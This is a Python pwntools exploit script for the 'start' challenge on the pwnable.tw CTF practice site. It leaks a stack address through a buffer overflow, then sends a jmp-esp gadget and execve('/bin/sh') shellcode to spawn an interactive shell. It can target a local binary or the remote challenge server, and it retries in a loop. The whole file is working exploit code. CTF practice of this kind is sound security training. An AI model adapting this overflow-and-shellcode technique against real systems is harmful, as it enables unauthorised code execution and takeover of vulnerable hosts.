#!python
# 
# Exploit for 'start' over at pwnable.tw
#
# Use pwndbg for better gdb
# https://github.com/pwndbg/pwndbg
#
# install pwntools
# pip install pwntools


from pwn import *
from struct import pack
import sys
import os

os.environ['LD_LIBRARY_PATH'] = os.getcwd()

challenge_bin = './start'

# print the ELF Binary Characteristics
elf  =  ELF(challenge_bin)
print(elf)


remote_connection = False
debug = False
if (len(sys.argv) > 1 and sys.argv[1] == '--throwit'):
    remote_connection = True
elif (len(sys.argv) > 1 and sys.argv[1] == '--debug'):
    debug =  True

entry_point = 0x08048060
rop_gadget  = 0x08048087

# Stack pointer is going to get realigned by 20 bytes when we send 20 A's
# but because of ASLR, the alignment is randomly shifted by some value of
# [2A, 3A, 4A, 5A, 6A, 7A, 8A, 9A, AA, ..]
# ESP always ends up as 0xFFFFFF?A and we always need to jump to 0xFFFFFF?4
# So I guess just chose a random offset
# offset = 0x3A
offset = 0x2B

jmpesp_shellcode = asm('\n'.join([
    'jmp esp',
]), bits=32)


execve_bin_sh_shellcode = asm('\n'.join([
    'push {}'.format(u32('/sh\0')),
    'push {}'.format(u32('/bin')),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]), bits=32)


def exploit(conn):
    _ = conn.recvuntil("Let's start the CTF:")

    stage1 =  ''
    stage1 += '\x90'*(20-len(jmpesp_shellcode))
    stage1 += jmpesp_shellcode
    stage1 += p32(rop_gadget)

    print("Stage1: Leaking memory to the heap")
    print("Sending: {}".format(repr(stage1)))
    conn.sendline(stage1)

    full_leak = conn.recv()
    #address_width = 4
    #leaks = [full_leak[i:i+address_width] for i in range(0, len(full_leak), address_width)]

    #for leak in leaks:
    #    print("Address {}".format(hex(u32(leak))))

    leak = u32(full_leak[:4])
    print("ESP      : {}".format(hex(leak)))
    print("ESP+{} : {}".format(hex(offset), hex(leak + offset)))

    stage2 =  ''
    stage2 += '\x90'*(20-len(jmpesp_shellcode))
    stage2 += jmpesp_shellcode
    stage2 += p32(0x0804809c)
    stage2 += p32(leak + offset)
    stage2 += execve_bin_sh_shellcode

    print("Stage2: Exploiting")
    print("Sending: {}".format(repr(stage2)))
    conn.sendline(stage2)



def throwing_it():

    conn = None
    if remote_connection:
        conn = remote('chall.pwnable.tw', 10000)
    else:
        if not debug:
            conn = process(challenge_bin)
        else:
            #    b {entry}
            #    b *({entry}+55) # READ
            #    b *({entry}+60) # RET
            conn = gdb.debug(challenge_bin,
                """
                b *({entry}+60)
                continue
                """.format(entry=entry_point))

    exploit(conn)

       # Check for EOF
    try:
        conn.recv(timeout=0.5)
    except(EOFError):
        conn.close()
        log.failure("Failed to Exploit")
        return


    log.success("BOOM got it :)")
    conn.interactive(prompt="")
    sys.exit()

while True:
    throwing_it()
